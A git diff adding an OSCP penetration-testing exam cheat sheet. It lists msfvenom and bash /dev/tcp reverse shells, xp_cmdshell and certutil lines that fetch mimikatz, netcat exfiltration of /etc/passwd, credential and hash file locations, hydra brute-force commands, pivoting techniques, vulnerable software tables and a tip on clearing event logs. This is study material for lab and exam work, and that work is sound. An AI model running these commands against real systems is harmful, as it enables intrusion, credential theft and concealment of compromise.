@@ -1,1 +1,518 @@
-# oscp_cheat_sheet_2025
+- [Capture the flag](#capture-the-flag)
+- [Reverse shell](#reverse-shell)
+- [File transfer](#file-transfer)
+- [Remote to other machines](#remote-to-other-machines)
+- [Ports scan](#ports-scan)
+
+# Capture the flag 
+- Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`  
+  - Linux
+    - `find / -name "local.txt" 2>/dev/null`  
+    - `cat /home/<username>/local.txt`  
+    - `cat /root/proof.txt`  
+  - Windows
+    - `PS C:\users> Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue`  
+    - `type C:\Users\<username>\Desktop\local.txt`  
+    - `type C:\Users\Administrator\Desktop\proof.txt`
+
+# Reverse shell
+- Kali listener
+  `nc -lvnp 443`
+- ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+  - aspx: cmdasp.aspx
+  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
+  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+- generate reverse shell payload  
+  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
+  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
+  **step 3 generate payload based on target platform**  
+  - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+  - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
+  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
+  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
+  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
+  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
+  - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
+    
+**Tips:**  
+  - Always match LPORT between payload and nc  
+  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
+  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
+
+# Files transfer 
+[PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
+ 
+- **Window**
+  - **C:\Windows\System32\config\SAM**
+  - **C:\Windows\System32\config\SYSTEM**
+  - C:\Windows\System32\config\SECURITY
+  - C:\Windows\NTDS\ntds.dit
+  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`  **
+  - LSASS memory dump `lsass.dmp`
+  - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
+  - task scheduler XML files: C:\Windows\System32\Tasks\
+  - **User data: C:\Users\<user>\Desktop, C:\Users\<user>\Documents**
+  - **Flag: local.txt, proof.txt**
+
+- **Linux**
+  - **SSH keys**
+    - ~/.ssh/id_rsa → private key
+    - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
+    - ~/.ssh/authorized_keys  
+  - **Password and shadow files**
+    - /etc/passwd → user accounts
+    - /etc/shadow → hashed passwords (requires root)
+  - **User Data**
+    - /home/<user>/Desktop/*
+    - /home/<user>/Documents/*
+    - local.txt, proof.txt
+  - **Sensitive files for privilege escalation**
+    - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
+    - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
+  - Configs
+    - /etc/apache2/sites-available/
+    - /etc/nginx/sites-available/
+    - /etc/apache2/sites-available/
+    - /etc/cron*/*
+    - crontab -l for each user
+  - Application credential files
+    - /var/www/html/config.php (web apps)
+    - wp-config.php (WordPress)
+  - Logs & Audit
+    - /var/log/auth.log → login attempts, sudo usage
+    - /var/log/secure → login/authentication info
+    - /var/log/syslog → system log
+- Windows from/to Kali
+  - **RDP mounting shared folder**  
+    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
+    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
+- **Transfer exploits to windows**
+   - `iwr http://<Kali-IP>/file.exe -OutFile file.exe`  
+   - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
+   - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
+   -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
+   -  Target execute the payload over internet
+      ```
+      download the package from https://github.com/gentilkiwi/mimikatz/releases
+      unzip to /home/kali/offsec/tools/minikatz
+      cd to /home/kali/offsec/tools/minikatz/x64
+      python3 -m http.server 80
+
+      target open the http://<KALI>
+      ```
+- Windows to Kali 
+  - Internet access
+    - WsgiDAV
+      ```
+      sudo apt install pipx -y
+      pipx ensurepath
+      pipx install wsgidav
+      mkdir ~/share
+
+      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
+      Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
+      ```
+   - No internet access
+     ```
+     #SMB
+     kali: impacket-smbserver share /tmp/smb
+     target: copy C:\path\to\file.txt \\<Kali-IP>\share\
+
+     smbclient -L \\\\192.168.171.10
+     smbclient \\\\192.168.171.10\\Users -N
+     smb: \> ls
+     smb: \offsec\Downloads\> get flag.txt
+     
+     #Netcat
+     kali: nc -lvnp 4444 > loot.txt
+     target: type C:\path\to\loot.txt | nc.exe <Kali-IP> 4444
+      
+     #Base64 encode
+     windows: certutil -encode C:\loot\file.txt file.b6
+     kali: base64 -d file.b64 > file.txt
+     ```
+- Linux to Kali
+  - Internet acces
+    - Net cat
+      ```
+      # On Kali (receiver)
+      nc -lvnp 4444 > file.txt
+      # On target (sender)
+      nc <kali_ip> 4444 < file.txt
+      ```
+  - No internet access
+    - Netcat reverse file transfer
+      ```
+      # On Kali (listener to receive file)
+      nc -lvnp 9001 > loot.tar.gz
+      # On target (send file)
+      tar czf - /etc/passwd | nc <kali_ip> 9001
+      ```
+    - SCP
+      `scp file.txt kali@<kali_ip>:/home/kali/`
+
+# Remote to other machines
+
+# Ports scan
+  - Kali port:
+    - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
+    - 8080 (burp suite)
+    - 8888 (WebDAV shared)
+    - 8000 (Powercat/Python)
+  - Target port
+
+| Port  | Protocol | Service     | Description / Use Case                                   | Attack / Enumeration Command |
+|-------|----------|-------------|----------------------------------------------------------|-------------------------------|
+| *21   | TCP      | FTP         | Anonymous login, weak creds, file upload                 | `nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p21 <IP>` <br> `ftp <IP>` |
+| *22   | TCP      | SSH         | Weak passwords, key reuse, outdated versions             | `nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p22 <IP>` <br> `hydra -l user -P rockyou.txt ssh://<IP>` |
+| *23   | TCP      | Telnet      | Plain-text credentials, banner info                      | `nmap --script telnet-encryption,telnet-ntlm-info -p23 <IP>` <br> `telnet <IP>` |
+| *25   | TCP      | SMTP        | User enum, phishing, open relay                          | `nmap --script smtp-enum-users,smtp-commands -p25 <IP>` <br> `smtp-user-enum -U /usr/share/wordlists/users.txt -t <IP>` |
+| *53   | TCP/UDP  | DNS         | Zone transfers, DNS enumeration                          | `dig @<IP> axfr domain.com` <br> `dnsrecon -d domain.com -t axfr` |
+| *80   | TCP      | HTTP        | Web apps (SQLi, LFI/RFI, RCE), Gobuster, Nikto           | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` <br> `nikto -h http://<IP>` |
+| 88    | TCP      | Kerberos    | AS-REP roasting, Kerberoasting (Active Directory)        | `GetNPUsers.py domain/user -dc-ip <IP>` <br> `GetUserSPNs.py domain/user:pass -dc-ip <IP>` |
+| *110  | TCP      | POP3        | Weak creds, cleartext creds                              | `nmap --script pop3-capabilities,pop3-ntlm-info -p110 <IP>` <br> `telnet <IP> 110` |
+| 111   | TCP/UDP  | RPCBind     | NFS, remote procedure enumeration                        | `nmap -sV --script=rpcinfo -p111 <IP>` |
+| *135  | TCP      | MS RPC      | Lateral movement, DCOM exploitation                      | `nmap -sV -p135 --script=msrpc-enum <IP>` |
+| *139  | TCP      | NetBIOS     | SMB enumeration, shares                                  | `enum4linux -a <IP>` <br> `nmap --script nbstat -p139 <IP>` |
+| 143   | TCP      | IMAP        | Cleartext creds, mailbox enum                            | `nmap --script imap-capabilities,imap-ntlm-info -p143 <IP>` |
+| 161   | UDP      | SNMP        | Public community strings, SNMPwalk                       | `snmpwalk -v2c -c public <IP>` |
+| *389  | TCP/UDP  | LDAP        | AD enum, user/group info                                 | `ldapsearch -x -H ldap://<IP> -s base namingcontexts` <br> `nmap --script ldap* -p389 <IP>` |
+| *445  | TCP      | SMB         | EternalBlue, shares, null sessions, LPE                  | `enum4linux -a <IP>` <br> `smbclient -L //<IP>/ -N` <br> `crackmapexec smb <IP>` |
+| 512   | TCP      | RSH         | Remote shell, legacy service                             | `rsh <IP> -l root` |
+| 513   | TCP      | RLogin      | Legacy login service                                     | `rlogin <IP>` |
+| 587   | TCP      | SMTP (Submission) | Authenticated email sending                        | `nmap --script smtp-commands -p587 <IP>` |
+| 1433  | TCP      | MSSQL       | Weak creds, xp_cmdshell abuse                            | `nmap --script ms-sql-info,ms-sql-empty-password -p1433 <IP>` <br> `sqsh -S <IP> -U sa -P password` |
+| 5985  | TCP      | WinRM       | Remote PowerShell execution                              | `evil-winrm -i <IP> -u user -p pass` |
+| *3306 | TCP      | MySQL       | SQLi, default creds, privilege escalation                | `nmap --script mysql* -p3306 <IP>` <br> `mysql -h <IP> -u root -p` |
+| *3389 | TCP      | RDP         | Weak creds                                               | `nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 <IP>` <br> `xfreerdp /u:user /p:pass /v:<IP>` |
+| 5432  | TCP      | PostgreSQL  | SQLi, privilege escalation                               | `psql -h <IP> -U postgres` |
+| *5900 | TCP      | VNC         | Misconfig, no password, weak creds                       | `nmap --script vnc-info,vnc-title -p5900 <IP>` <br> `vncviewer <IP>` |
+| 8000  | TCP      | HTTP-alt    | Python web server, custom services                       | `curl http://<IP>:8000` <br> `gobuster dir -u http://<IP>:8000 -w /usr/share/wordlists/dirb/common.txt` |
+| *8080 | TCP      | Web Proxies | Tomcat, Jenkins, apps on alt ports                       | `nmap --script http-enum -p8080 <IP>` <br> `curl http://<IP>:8080` |
+| *8443 | TCP      | HTTPS-alt   | Web services over TLS                                    | `nmap --script ssl-cert,ssl-enum-ciphers -p8443 <IP>` |
+| 8888  | TCP      | Web Apps    | Jupyter, Flask, dev interfaces                           | `curl http://<IP>:8888` <br> `gobuster dir -u http://<IP>:8888 -w /usr/share/wordlists/dirb/common.txt` |
+
+
+- Quick top-ports-scan
+  `nmap -T4 --top-ports 1000 -sC -sV -oN quick_tcp.txt <IP>`  
+- Full TCP scan  
+  `nmap -p- -sC -sV -oN full_tcp.txt <IP>`  
+- UDP scan (53 DNS, 69 TFTP, 123 NTP, 137/138 NetBIOS, 161 SNMP, 500 IKE/IPSec)    
+  `nmap -sU --top-ports 100 -oN top100_udp.txt <IP>`  
+  `nmap -sU -p- -oN full_udp.txt <IP>`  
+  `nmap -p <ports> -sC -sV -oN targeted.txt <target>`  
+- Combined TCP & UDP  
+  `nmap -sS -sU --top-ports 100 -oN top_tcp_udp.txt <IP>`
+
+# Penetration testing stages
+1. scope: IP range, hosts, applications
+1. info gathering (passive or active): org infra, assets, personnel
+1. vulnerability detection
+1. initial foothold
+1. privilege escalation
+1. lateral movement
+1. report
+1. remediation
+
+# Recommended OSCP Cracking Tools & Usage (2025)
+| Tool              | Purpose                                  | Sample Command | Info / Output |
+|------------------|------------------------------------------|----------------|----------------|
+| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
+| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
+| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
+| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
+| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
+| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
+| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
+| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
+| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
+| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
+| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
+| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
+| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
+| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
+| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
+| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
+| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
+| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
+| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
+| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
+| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
+| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
+| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
+| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
+| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |
+
+## OSCP Pro Tips
+- Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
+- Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
+- After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
+- Use **Impacket**, **CME**, or **Chisel** for pivoting.
+- Crack hashes using **John**, **Hashcat**, or online resources.
+
+| Tip Category       | Tip |
+|--------------------|-----|
+| **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
+| **Time Management** | Spend no more than 1 hour per box if you're stuck. Move on and return later. |
+| **Initial Foothold** | Look for unauthenticated pages, exposed SMB/NFS shares, backup files (`.bak`, `.zip`), default creds. |
+| **Passwords** | Try **rockyou.txt** and known weak creds. Look for reused passwords across services. |
+| **Linux Privesc** | Run `linpeas.sh`, check for SUID binaries, writable `/etc/passwd`, crontabs, misconfigured services. |
+| **Windows Privesc** | Use `winPEAS`, `whoami /priv`, and check for AlwaysInstallElevated, weak folder permissions, unquoted service paths. |
+| **Reverse Shell Tips** | Use `ncat`, `msfvenom`, or `bash -i >& /dev/tcp` variants. Have multiple listeners ready (4444, 5555). |
+| **Pivoting** | Use **Chisel** or **SSH tunnels** to reach internal networks. Don’t overlook second-level escalation. |
+| **Reporting** | Take screenshots of each flag, privilege escalation step, and exploit. Label clearly. |
+| **Persistence** | If you lose shell, try to re-exploit quickly. Always upload a reverse shell backup (`nc.exe`, `bash shell`, etc.). |
+| **VPN Stability** | If VPN disconnects, your *target machines will reset*. Save all notes **locally** in case of resets. |
+| **Proof Files** | Submit `proof.txt` and `local.txt` for each rooted box. These are essential for point calculation. |
+| **Mental Game** | Stay calm. 3 roots + 1 user = pass. Don’t panic over one tough box. Maximize your strengths. |
+
+## 🟡 1. Information Gathering / Recon
+| Tool            | Purpose                                | Sample Command |
+|-----------------|----------------------------------------|----------------|
+| `nmap`          | Port scanning, service/version detect  | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
+| `AutoRecon`     | Automated recon pipeline               | `autorecon 10.10.10.10` |
+| `whatweb`       | Detect web technologies                | `whatweb http://target` |
+| `gobuster`      | Web dir brute-force                    | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
+| `feroxbuster`   | Recursive web discovery                | `feroxbuster -u http://target -w wordlist.txt` |
+| `ffuf`          | Web fuzzing                            | `ffuf -u http://target/FUZZ -w wordlist.txt` |
+| `nikto`         | Web vulnerability scanner              | `nikto -h http://target` |
+| `whatweb`       | Identify web frameworks                 | `whatweb http://target` |
+| `theHarvester`  | Email, domain, subdomain harvesting    | `theharvester -d target.com -b google` |
+| `amass`         | Subdomain enumeration                  | `amass enum -d target.com` |
+
+## 🔵 2. Enumeration
+| Tool             | Purpose                                 | Sample Command |
+|------------------|-----------------------------------------|----------------|
+| `enum4linux-ng`  | Enumerate Windows shares, users         | `enum4linux-ng -A 10.10.10.10` |
+| `crackmapexec`   | SMB, RDP, WinRM share/user checks       | `cme smb 10.10.10.10 -u user -p pass` |
+| `smbclient`      | Access SMB shares                       | `smbclient //10.10.10.10/share` |
+| `ldapsearch`     | Query LDAP directory                    | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com"` |
+| `snmpwalk`       | SNMP device enumeration                 | `snmpwalk -v2c -c public 10.10.10.10` |
+| `sqlmap`         | Automated SQLi and DB dump              | `sqlmap -u "http://target?id=1" --dbs` |
+| `wfuzz`          | Web fuzzing                             | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
+| `impacket-samrdump` | SAMR info enumeration                | `samrdump.py 10.10.10.10` |
+
+## 🟢 3. Gaining Access (Exploitation)
+
+| Tool           | Purpose                                  | Sample Command |
+|----------------|------------------------------------------|----------------|
+| `msfvenom`     | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe` |
+| `Metasploit`   | Framework for exploitation                | `msfconsole → use exploit/multi/handler` |
+| `ncat`         | Reverse shell handling                    | `ncat -lvnp 4444` |
+| `python`       | Simple webserver                          | `python3 -m http.server 80` |
+| `wget` / `curl`| File retrieval                            | `wget http://attacker/shell.sh` |
+| `searchsploit` | Local exploit database search             | `searchsploit apache 2.4` |
+| `nishang`      | PowerShell payloads                       | Import scripts for Windows shells |
+
+## 🟠 4. Privilege Escalation
+| Tool             | Purpose                                | Sample Command |
+|------------------|----------------------------------------|----------------|
+| `linpeas.sh`     | Linux privesc script                    | `./linpeas.sh` |
+| `winPEAS.exe`    | Windows privesc script                  | `winPEASx64.exe` |
+| `sudo -l`        | List sudo privileges                    | `sudo -l` |
+| `pspy`           | Monitor Linux processes                 | `./pspy64` |
+| `linux-exploit-suggester.sh` | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
+| `windows-exploit-suggester.py` | Windows patch-based escalation | `python windows-exploit-suggester.py` |
+| `mimikatz`       | Credential dumping on Windows           | `sekurlsa::logonpasswords` |
+
+## 🔴 5. Post-Exploitation / Lateral Movement
+| Tool             | Purpose                                | Sample Command |
+|------------------|----------------------------------------|----------------|
+| `wmiexec.py`     | Remote command execution via WMI       | `wmiexec.py user:pass@target` |
+| `psexec.py`      | Run commands via SMB                   | `psexec.py user:pass@target` |
+| `secretsdump.py` | Dump Windows hashes                    | `secretsdump.py user:pass@target` |
+| `chisel`         | TCP tunneling / pivoting               | `chisel client attacker:9001 R:127.0.0.1:3389` |
+| `responder`      | LLMNR poisoning                        | `responder -I eth0` |
+| `BloodHound`     | AD enumeration via neo4j               | Use with `SharpHound` collector |
+
+## 🟣 6. Reporting & Cleanup
+| Tool              | Purpose                               | Sample Command |
+|-------------------|---------------------------------------|----------------|
+| `asciinema`       | Terminal session recording            | `asciinema rec` |
+| `screenshot tools`| Capture flags / proof steps           | Manual or `gnome-screenshot` |
+| `cherrytree`      | Reporting and note keeping            | GUI |
+| `keepnote`        | Note organization                     | GUI |
+| `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |
+
+# Port tunneling and port redirection 
+<img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  
+
+**Option 1: Port Redirection using socat (Simple)**  
+Pivot machine A: socat TCP-LISTEN:8888,fork TCP:172.16.10.10:80  
+Kali: curl http://10.10.10.5:8888  
+
+**Option 2: SSH Tunneling - Local Forwarding (if SSH access on A)**  
+kali: ssh -L 8888:172.16.10.10:80 user@10.10.10.5  
+kali: curl http://localhost:8888  
+
+**Option 3: Dynamic Proxy via SSH (SOCKS5)**  
+kali: ssh -D 9050 user@10.10.10.5  
+Edit /etc/proxychains.conf: socks5  127.0.0.1 9050  
+kali: proxychains nmap -Pn -sT -p80 172.16.10.10  
+
+| **Concept**                      | **You Want To...**                              | **Scenario**                                                                 | **Technique**                | **Command Example**                                                                                                                                       | **Notes**                                                                                  |
+|----------------------------------|--------------------------------------------------|------------------------------------------------------------------------------|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
+| **Port Redirection using socat** | Access internal RDP/web from pivot host         | You compromised `10.10.10.5`, want to reach `172.16.5.10:3389` (RDP)         | socat TCP Port Forward       | `socat TCP-LISTEN:3389,fork TCP:172.16.5.10:3389` *(on pivot)*<br>`rdesktop 10.10.10.5:3389` *(on Kali)*                                                  | No encryption; simple TCP relay                                                            |
+| **SSH Local Port Forwarding**    | Access internal web via tunnel                  | You have SSH on `10.10.10.5`, want to view `172.16.5.10:80`                  | `ssh -L` (local forward)     | `ssh -L 8888:172.16.5.10:80 user@10.10.10.5`<br>`curl http://localhost:8888` *(on Kali)*                                                                   | Great for web/DB services                                                                 |
+| **SSH Remote Port Forwarding**   | Let victim connect back to you                 | Firewall blocks reverse shell directly, but allows SSH outbound              | `ssh -R` (reverse tunnel)    | `ssh -R 4444:localhost:4444 kali@your.kali.ip` *(on pivot)*<br>`nc -lvnp 4444` *(on Kali)*                                                                 | Good for shells from behind firewalls                                                      |
+| **SSH Dynamic Proxy**            | Proxy tools through pivot host                 | You want to scan or browse internal network via `10.10.10.5`                | `ssh -D` (SOCKS5 Proxy)      | `ssh -D 9050 user@10.10.10.5` *(on Kali)*<br>Set `proxychains.conf`: `socks5 127.0.0.1 9050`<br>`proxychains nmap -Pn -sT 172.16.5.10`                    | Enables `proxychains`, Gobuster, browsers                                                  |
+| **Chisel (Reverse Tunnel)**      | Pivot without SSH, e.g., Windows box           | Compromised host runs Chisel reverse client to you                          | Chisel SOCKS over reverse    | `chisel server -p 8000 --reverse` *(on Kali)*<br>`chisel client yourip:8000 R:1080:socks` *(on pivot)*                                                    | Useful on Windows without SSH                                                              |
+| **iptables NAT (Linux pivot)**   | Route traffic via Linux box without tools      | You have root on a Linux pivot with `iptables`                              | Linux NAT Port Forward       | `iptables -t nat -A PREROUTING -p tcp --dport 3333 -j DNAT --to-destination 172.16.5.10:80` *(on pivot)*<br>`curl http://10.10.10.5:3333` *(on Kali)*     | Native but less flexible; requires root                                                    |
+
+| **Step** | **Action**                          | **Command**                                                                                      | **Run on**        |
+|----------|--------------------------------------|--------------------------------------------------------------------------------------------------|-------------------|
+| 1        | Prepare Chisel binaries              | `wget ... && gunzip ... && chmod +x ...` (see full commands below)                              | Kali              |
+| 2        | Start HTTP server to serve files     | `python3 -m http.server 80`                                                                      | Kali              |
+| 3        | Download Chisel binary               | `wget http://<kali-ip>/chisel.elf` or PowerShell `Invoke-WebRequest`                            | Victim            |
+| 4        | Start Chisel server (reverse mode)   | `./chisel.elf server -p 8000 --reverse`                                                          | Kali              |
+| 5        | Start Chisel client (reverse tunnel) | `./chisel.elf client <kali-ip>:8000 R:1080:socks` <br> or `chisel.exe ...`                      | Victim            |
+| 6        | Configure proxychains                 | Add `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`                                           | Kali              |
+| 7        | Use proxychains to access internal   | `proxychains nmap -Pn -sT -p80 172.16.10.10` <br> `proxychains curl http://172.16.10.10`         | Kali              |
+
+# OSCP Vulnerable Software Versions
+**Remote Exploits / Service Exploits**
+
+| Software          | Vulnerable Version(s) | Exploit / CVE                           |
+|------------------|------------------------|-----------------------------------------|
+| Apache Tomcat    | 7.x < 7.0.81           | CVE-2017-12615 (PUT upload RCE)         |
+| vsftpd           | 2.3.4                  | Backdoor RCE                            |
+| Exim             | < 4.89                 | CVE-2019-10149 (Command Injection)      |
+| ProFTPD          | 1.3.5                  | CVE-2015-3306 (mod_copy RCE)            |
+| MySQL            | 5.5.5 (config issue)   | CVE-2012-2122 (Auth bypass)             |
+| Apache httpd     | 2.2.x, 2.4.x (old)     | mod_ssl, mod_cgi RCEs                   |
+| PHP              | < 5.6.x, < 7.1.x       | Unserialize RCE                         |
+| Drupal           | 7.x / 8.x              | CVE-2018-7600 (Drupalgeddon 2)          |
+| Jenkins          | 1.x / 2.x              | Script console RCE                      |
+| Nagios XI        | Various                | Command Injection                       |
+| Webmin           | 1.910                  | CVE-2019-15107 (Password change RCE)    |
+| OpenSSH          | 7.2p2, 5.x             | CVE-2016-0777 (Key leak)                |
+| Samba            | 3.x / 4.5.x            | CVE-2017-7494 (Writable share RCE)      |
+| Django           | ≤ 1.2.1                | Template injection RCE                  |
+| Windows SMB      | Win 7 / Server 2008    | CVE-2017-0144 (EternalBlue)             |
+| FTP (anonymous)  | Misconfigured          | Upload shell access                     |
+| WordPress        | ≤ 4.7.0                | REST API content injection              |
+| phpMyAdmin       | ≤ 4.8.x                | Auth bypass / LFI                       |
+| Elasticsearch    | < 1.6                  | CVE-2015-1427 (Groovy script RCE)       |
+| DotNetNuke (DNN) | < 9.2                  | CVE-2017-9822 (Install RCE)             |
+
+**Local Privilege Escalation**
+
+| OS / Software     | Vulnerable Version(s) | Exploit / CVE                       |
+|------------------|------------------------|-------------------------------------|
+| Linux Kernel      | 2.6.32 – 4.4.x         | CVE-2016-5195 (DirtyCow)            |
+| Linux Kernel      | ≤ 4.15                 | OverlayFS (Ubuntu)                 |
+| Linux Kernel      | 2.6.37 – 5.x           | CVE-2022-0847 (DirtyPipe)           |
+| Polkit (pkexec)   | ≤ 0.105                | CVE-2021-4034 (PwnKit)              |
+| Sudo              | ≤ 1.8.25p1             | CVE-2019-14287 (Bypass)             |
+| Cron              | Misconfigured          | PATH hijacking                      |
+| /etc/passwd       | Writable               | Root shell via user change          |
+| MySQL             | Running as root        | UDF-based privesc                   |
+| NFS               | no_root_squash         | Root shell via mount                |
+| Cron + writable   | Root cron job          | Privesc via script injection        |
+| Windows: AlwaysInstallElevated | Enabled   | SYSTEM shell via .msi               |
+| Windows: Service Path | Unquoted path      | Binary replacement                  |
+| Windows: Weak perms| Modifiable service    | Replace exe                         |
+| Windows: Token abuse | SeImpersonate enabled| Juicy Potato / Rogue Potato         |
+| Windows: UAC bypass| Win 7 / 10            | fodhelper / sdclt                   |
+| Windows: DLL Hijack| Misconfigured service | Load custom DLL as SYSTEM           |
+
+**Sample SearchSploit Usage**
+searchsploit vsftpd 2.3.4
+searchsploit samba 3.0
+searchsploit tomcat 7.0.81
+searchsploit linux kernel 4.15
+
+# Protocols login
+| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
+|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
+| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
+|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
+| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
+|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
+| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
+|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
+| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
+| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
+|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
+|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
+| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
